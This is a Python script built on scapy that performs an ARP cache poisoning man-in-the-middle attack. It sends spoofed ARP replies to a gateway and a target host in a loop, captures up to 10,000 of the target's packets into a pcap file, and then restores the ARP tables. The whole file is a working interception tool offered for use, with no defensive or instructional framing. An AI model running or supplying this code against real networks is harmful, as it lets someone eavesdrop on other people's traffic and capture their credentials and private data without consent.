import os
import random
import string
import time
import threading
import signal
import sys
from scapy.all import *


#The game here is tricking the gateway into believing that the target_ip is at our mac, and doing the same for the target with the gat#eway.
def poison(target_ip, target_mac, gateway_ip, gateway_mac):

	poison_gateway = ARP()
	poison_gateway.op = 2
	poison_gateway.psrc = target_ip
	poison_gateway.hwdst = gateway_mac
	poison_gateway.pdst = gateway_ip

	poison_target = ARP()
	poison_target.op = 2
	poison_target.psrc = gateway_ip
	poison_target.hwdst = target_mac
	poison_target.pdst = target_ip

	print("[*]Starting ARP poisoning attack...")
	try:
		while True:
			send(poison_target)
			send(poison_gateway)

			time.sleep(2)
	
	except KeyboardInterrupt:
		print("[*]ARP poisoning ended")
		return

def restore_target(target_ip, target_mac, gateway_ip, gateway_mac):
	
	print("[*]Restoring ARP cache...")
	send(ARP(op=2,psrc=target_ip,pdst=gateway_ip,hwsrc=target_mac,hwdst=gateway_mac))
	send(ARP(op=2,psrc=gateway_ip,pdst=target_ip,hwsrc=gateway_mac,hwdst=target_mac))

	os.kill(os.getpid(), signal.SIGINT)
	
def get_mac(ip_address):
	
	response, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1,pdst=ip_address),timeout=2,retry=10)

	for s,r in response:
		s.show()
		r.show()
		return r[ARP].hwsrc
def id_gen(size = 6, chars=string.digits):
	return ''.join([random.choice(chars) for i in range(size)])

if len(sys.argv) != 3:
	print("Usage: python(3) %s <gateway_ip> <target_ip>" %sys.argv[0])
	exit()
conf.verb = 0
conf.iface = "wlan0"
gateway_ip = sys.argv[1]
target_ip = sys.argv[2]

gateway_mac = get_mac(gateway_ip)
target_mac = get_mac(target_ip)

if gateway_mac is None or target_mac is None:
	print("[!]Failed at getting MAC of IPs given!")
	exit(0)
else:
	print("[+] %s is at %s, %s is at %s" %(gateway_ip, gateway_mac, target_ip, target_mac))

t = threading.Thread(target=poison, args=(target_ip, target_mac, gateway_ip, gateway_mac))
t.start()

try:
	print("[*]Starting packet sniffing...")
	f = "ip host %s" %target_ip

	packets = sniff(filter=f,count=10000)
	print("[+]Writing to file...")
	filename = id_gen();
	wrpcap('%s.pcap' %filename, packets)
	restore_target(target_ip, target_mac, gateway_ip, gateway_mac)

except KeyboardInterrupt:
	restore_target(target_ip, target_mac, gateway_ip, gateway_mac)



